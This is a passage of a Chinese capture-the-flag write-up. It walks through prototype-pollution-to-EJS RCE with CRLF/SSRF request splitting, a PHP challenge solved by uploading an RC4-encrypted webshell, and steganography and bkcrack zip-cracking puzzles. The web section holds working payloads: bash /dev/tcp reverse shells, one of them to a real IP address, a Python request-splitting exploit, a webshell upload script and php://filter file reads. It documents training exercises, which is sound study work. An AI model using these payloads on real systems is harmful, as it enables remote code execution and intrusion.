+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Before : &#34;</span> <span style="color:#f92672">+</span> {}.<span style="color:#a6e22e">polluted</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">safeObj</span>. <span style="color:#a6e22e">expand</span> (<span style="color:#a6e22e">obj</span>,<span style="color:#e6db74">&#39;__proto__.polluted&#39;</span>,<span style="color:#e6db74">&#39;Yes! Its Polluted&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;After : &#34;</span> <span style="color:#f92672">+</span> {}.<span style="color:#a6e22e">polluted</span>);
+</span></span></code></pre></div><p>发现确实可以</p>
+<!-- raw HTML omitted -->
+<p>然后题目源码app.js里也有说使用ejs模板</p>
+<p>那么可以原型链污染+ejs RCE</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;__proto__&#34;</span>:{<span style="color:#f92672">&#34;outputFunctionName&#34;</span>:<span style="color:#e6db74">&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/xxx/4444 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;</span>}}
+</span></span></code></pre></div><p><code>constructor.prototype</code>替代<code>__proto__</code> 为</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;constructor.prototype.outputFunctionName&#34;</span>: <span style="color:#e6db74">&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&#34;</span><span style="color:#960050;background-color:#1e0010">bash</span> <span style="color:#960050;background-color:#1e0010">-i</span> <span style="color:#960050;background-color:#1e0010">&gt;&amp;</span> <span style="color:#960050;background-color:#1e0010">/dev/tcp/xxx/</span><span style="color:#ae81ff">4444</span> <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&gt;&amp;</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">\\</span><span style="color:#e6db74">&#34;&#39;);var __tmp2&#34;</span>}
+</span></span></code></pre></div><p>现在看/curl路由</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/curl&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">q</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">q</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">resp</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">q</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:3000/?q=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">q</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>,(<span style="color:#a6e22e">res1</span>)=&gt;{
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">statusCode</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">res1</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">contentType</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">res1</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;content-type&#39;</span>];
+</span></span><span style="display:flex;"><span>                  
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">error</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// 任何 2xx 状态码都表示成功响应，但这里只检查 200。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">statusCode</span> <span style="color:#f92672">!==</span> <span style="color:#ae81ff">200</span>) {
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;Request Failed.\n&#39;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">`Status Code: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">statusCode</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span>);
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e">// 消费响应数据以释放内存
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                      <span style="color:#a6e22e">res1</span>.<span style="color:#a6e22e">resume</span>();
+</span></span><span style="display:flex;"><span>                      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                  
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">res1</span>.<span style="color:#a6e22e">setEncoding</span>(<span style="color:#e6db74">&#39;utf8&#39;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">rawData</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">res1</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;data&#39;</span>, (<span style="color:#a6e22e">chunk</span>) =&gt; { <span style="color:#a6e22e">rawData</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">chunk</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#39;request success&#39;</span>) });
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">res1</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;end&#39;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>                      <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsedData</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">rawData</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">parsedData</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>                      } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>                      }
+</span></span><span style="display:flex;"><span>                    });
+</span></span><span style="display:flex;"><span>                  }).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">`Got error: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>                  })
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#39;ok&#39;</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">error</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;search param &#39;q&#39; missing!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>http.get()请求了<code>http://localhost:3000/</code>并传递参数q  存在</p>
+<p>现在如何满足/copy路由下的ip为127.0.0.1呢？ 利用CRLF+SSRF</p>
+<p>参考此文https://xz.aliyun.com/t/9707#toc-11</p>
+<p>Unicode 字符损坏造成的 HTTP 拆分攻击</p>
+<p>exp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39; HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /copy HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: 127.0.0.1:3000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 180
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cache-Control: max-age=0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Upgrade-Insecure-Requests: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: application/json
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Encoding: gzip, deflate
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{&#34;constructor.prototype.outputFunctionName&#34;: &#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/47.100.196.3/4444 0&gt;&amp;1</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;&#39;);var __tmp2&#34;}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET / HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">test:&#39;&#39;&#39;</span><span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload_encode</span>(raw):
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#e6db74">u</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> raw:
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">0x0100</span><span style="color:#f92672">+</span>ord(i))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload_encode(payload)
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#拿到payload：ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįţůŰŹĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıĺĳİİİčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠıĸİčĊŃšţŨťĭŃůŮŴŲůŬĺĠŭšŸĭšŧťĽİčĊŕŰŧŲšŤťĭŉŮųťţŵŲťĭŒťűŵťųŴųĺĠıčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįŪųůŮčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįıİĹĮİĮİĮİĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹĬťŮĻűĽİĮĸĬŲŵĻűĽİĮķĬŪšĻűĽİĮĶčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊŻĢţůŮųŴŲŵţŴůŲĮŰŲůŴůŴŹŰťĮůŵŴŰŵŴņŵŮţŴũůŮŎšŭťĢĺĠĢşŴŭŰıĻŧŬůŢšŬĮŰŲůţťųųĮŭšũŮōůŤŵŬťĮŲťűŵũŲťĨħţŨũŬŤşŰŲůţťųųħĩĮťŸťţĨħŢšųŨĠĭţĠŜĢŢšųŨĠĭũĠľĦĠįŤťŶįŴţŰįĴķĮıİİĮıĹĶĮĳįĴĴĴĴĠİľĦıŜĢħĩĻŶšŲĠşşŴŭŰĲĢŽčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ</span>
+</span></span></code></pre></div><p>payload进行url编码传入q参数</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302041853803.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302041853803.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302041853803.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302041853803.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302041853803.png"
+        title="image-20230204185301694" /></p>
+<!-- raw HTML omitted -->
+<h2 id="unusual-php">unusual php</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#34;a&#34;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;upload&#34;</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], <span style="color:#e6db74">&#34;upload/&#34;</span><span style="color:#f92672">.</span>$_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">elseif</span> ($_GET[<span style="color:#e6db74">&#34;a&#34;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;read&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($_GET[<span style="color:#e6db74">&#34;file&#34;</span>]);
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">elseif</span> ($_GET[<span style="color:#e6db74">&#34;a&#34;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;version&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">phpinfo</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>尝试读index.php，是乱码，是对php源码进行了加密</p>
+<p>还可以看phpInfo()</p>
+<p>到这里就不知道如何走了，看师傅们是去在phpinfo里找到 zend_test.so</p>
+<p>总之php文件被加密了，寻找加密猜测应该是有依赖，思路可以是读 <code>/proc/self/maps</code></p>
+<blockquote>
+<p>读取 /proc/self/maps 查看当前进程的内存映射关系，发现加载了一个名为zend_test的扩展</p>
+</blockquote>
+<!-- raw HTML omitted -->
+<p>拿到文件路径/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so</p>
+<p>然后读取，通过php:filter 进行base64加密一下 防止丢字符</p>
+<pre tabindex="0"><code>/?a=read&amp;file=php://filter/convert.base64-encode/resource=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051221769.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051221769.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051221769.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051221769.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051221769.png"
+        title="image-20230205122100694" /></p>
+<p>保存出来用IDA分析 （注意保存完整）</p>
+<p>有个 rce_set_key函数</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051345028.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051345028.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051345028.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051345028.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051345028.png"
+        title="image-20230205134513970" /></p>
+<p>jump 到引用它的地方</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051349590.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051349590.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051349590.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051349590.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051349590.png"
+        title="image-20230205134928558" /></p>
+<p>F5反编译</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051338559.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051338559.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051338559.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051338559.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051338559.png"
+        title="image-20230205133812516" /></p>
+<p>逆向分析出来存在 RC4 密钥 abcsdfadfjiweur</p>
+<p>这样我们可以加密php文件，进行上传，这样后台应该会顺利解析执行</p>
+<p>可以用CyberChef来加密</p>
+<p>加密一个shell</p>
+<!-- raw HTML omitted -->
+<p>为了防止字符短缺，还是base64一下，上传文件时候base64解码一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=upload&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;473xeG4d3kJANayE56+fzrJLaDo2vtMx&#39;</span>
+</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;file&#39;</span>: (<span style="color:#e6db74">&#34;shell.php&#34;</span>, base64<span style="color:#f92672">.</span>b64decode(shell))}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, files<span style="color:#f92672">=</span>files)
+</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>上传shell成功执行</p>
+<!-- raw HTML omitted -->
+<p>复现环境是有回显且直接cat到了flag</p>
+<p>不涉及提权，原题可以用sudo 提权</p>
+<!-- raw HTML omitted -->
+<h1 id="misc">misc</h1>
+<h2 id="签到">签到</h2>
+<!-- raw HTML omitted -->
+<p>jpg文件，FF D9就是文件尾了</p>
+<p>后面的一堆字符是有问题的，还有2023 和 flag的字样</p>
+<p>编码的问题 ，16进制转中文字符，cyberchef直接转</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051324338.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051324338.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051324338.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051324338.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051324338.png"
+        title="image-20230205132424284" /></p>
+<h2 id="mp3">mp3</h2>
+<p>mp3 foremost 出png</p>
+<p>png 继续 zsteg</p>
+<p>提取出zip</p>
+<!-- raw HTML omitted -->
+<p>是个真加密</p>
+<p>mp3预览的图片就是那个png</p>
+<!-- raw HTML omitted -->
+<p>像素转01后提取出了个zip,但是与上面lsb提取的是一样的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;hb.png&#39;</span>)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">53</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
+</span></span><span style="display:flex;"><span>      pixel <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>getpixel((x,y))
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> pixel <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
+</span></span><span style="display:flex;"><span>         res<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>         res<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;0&#39;</span>
+</span></span><span style="display:flex;"><span>print(res)
+</span></span></code></pre></div><p>压缩包密码大概率就是MP3Stego提取的东西</p>
+<p>MP3Stego 是空密码（比赛时候没试出来。。）</p>
+<p>这个工具还一定要进这个MP3Stego目录下，使用里面的Decode.exe</p>
+<!-- raw HTML omitted -->
+<p>空密码跑出来了 ，里面就是压缩包密码 8750d5109208213f</p>
+<!-- raw HTML omitted -->
+<p>rot47  jsfuck</p>
+<h2 id="take_the_zip_easy">take_the_zip_easy</h2>
+<p>爆破无果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051249753.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051249753.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051249753.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051249753.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051249753.png"
+        title="image-20230205124950694" /></p>
+<p>根据文件名，猜测dasflow.zip里面也是dasflow.pacpng</p>
+<p>用bkcrack明文攻击 ,1.txt 里面是 dasflow.pcapng ,加上zip默认头<code>504B0304</code></p>
+<pre tabindex="0"><code>./bkcrack.exe -C zipeasy.zip -c dasflow.zip -p 1.txt -o 30 -x 0 504B0304 &gt;1.log
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051326635.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051326635.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051326635.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051326635.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051326635.png"
+        title="image-20230205132607529" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051325694.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051325694.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051325694.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051325694.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051325694.png"
+        title="image-20230205132554662" /></p>
+<p>跑出keys <code>2b7d78f3 0ebcabad a069728c</code></p>
+<pre tabindex="0"><code>./bkcrack.exe -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip
+</code></pre><p>成功解压，拿到流量包</p>
+<p>在第6个流里看到</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051353146.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051353146.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051353146.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051353146.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051353146.png"
+        title="image-20230205135301066" /></p>
+<p>哥斯拉流量加密，air123是密码</p>
